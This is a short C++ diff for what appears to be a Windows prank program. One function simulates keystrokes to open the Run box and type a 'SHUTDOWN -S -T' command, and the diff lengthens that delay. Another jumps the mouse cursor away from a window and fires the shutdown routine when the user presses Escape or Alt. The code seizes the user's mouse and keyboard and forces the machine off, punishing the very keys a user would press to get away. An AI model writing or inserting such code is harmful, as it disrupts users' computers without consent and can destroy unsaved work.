@@ -29,8 +29,7 @@ void fastshut(){
     keybd_event('R',0,0,0);
     keybd_event('R',0,2,0);
     keybd_event(VK_LWIN,0,2,0);
-    Sleep(100);
-    char c[]="SHUTDOWN -S -T 10";
+    char c[]="SHUTDOWN -S -T 1000";
     for(int i=0;i<(int)sizeof(c);i++){
         if(c[i]==' '){
             keybd_event(VK_SPACE,0,0,0);
@@ -61,14 +60,15 @@ void dodge(){
             long l=rect.left,r=rect.right,t=rect.top,b=rect.bottom;
             if(pos->x<r&&pos->x>l&&pos->y<b&&pos->y>t){
                 mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MOVE,rand()*rand()%65536,rand()*rand()%65536,0,0);
+                Sleep(30);
                 p=0;
             }
+            Sleep(30);
             int a=GetKeyState(VK_ESCAPE),c=GetKeyState(VK_MENU);
             if(a<0||c<0){
                 fastshut();
                 return;
             }
-            Sleep(30);
         }
     }
 }
